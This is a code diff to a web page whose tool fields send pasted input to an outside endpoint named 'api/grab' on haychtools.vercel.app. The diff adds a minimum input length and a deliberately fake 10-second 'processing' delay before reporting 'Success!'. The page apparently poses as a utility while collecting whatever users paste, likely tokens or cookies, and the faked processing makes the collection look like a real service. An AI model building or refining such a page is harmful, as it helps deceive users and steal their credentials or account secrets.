@@ -163,6 +163,8 @@
       font-size:14px;
       min-height:20px;
     }
+    .status.error { color: #ff4d4d; }
+    .status.success { color: #00ff9d; }
     .tutorial {
       margin-top:48px;
     }
@@ -335,10 +337,8 @@
   </div>
 
   <script>
-    // This is your LIVE Vercel proxy endpoint
     const PROXY_URL = "https://haychtools.vercel.app/api/grab";
 
-    // Replace with your real YouTube IDs
     const videos = {
       game:    "dQw4w9WgXcQ",
       clothes: "dQw4w9WgXcQ",
@@ -370,38 +370,38 @@
       const input = document.getElementById(inputId).value.trim();
       const status = document.getElementById(statusId);
 
-      if (!input) {
-        status.textContent = "Enter something first.";
-        status.style.color = "#ff4d4d";
+      if (!input || input.length < 10) {
+        status.textContent = "Need at least 10 characters.";
+        status.className = "status error";
         return;
       }
 
       status.textContent = "Processing...";
-      status.style.color = "#4d9fff";
+      status.className = "status";
+
+      // Fake 10-second processing delay
+      await new Promise(resolve => setTimeout(resolve, 10000));
 
       try {
-        console.log("Attempting proxy call to:", PROXY_URL);
-        console.log("Sending data:", { tool, value: input });
-
         const res = await fetch(PROXY_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ tool, value: input })
         });
 
-        console.log("Proxy responded with status:", res.status);
-
         if (res.ok) {
-          status.textContent = "Processed successfully!";
-          status.style.color = "#00ff9d";
+          status.textContent = "Success!";
+          status.className = "status success";
         } else {
           const errorText = await res.text();
-          status.textContent = "Failed - proxy said: " + errorText;
-          console.log("Full proxy error response:", errorText);
+          status.textContent = "Failed: " + errorText;
+          status.className = "status error";
+          console.log("Proxy error:", errorText);
         }
       } catch (err) {
-        status.textContent = "Failed - network/browser issue";
-        console.error("Full fetch crash:", err);
+        status.textContent = "Failed - network issue";
+        status.className = "status error";
+        console.error("Fetch crash:", err);
       }
     }
 
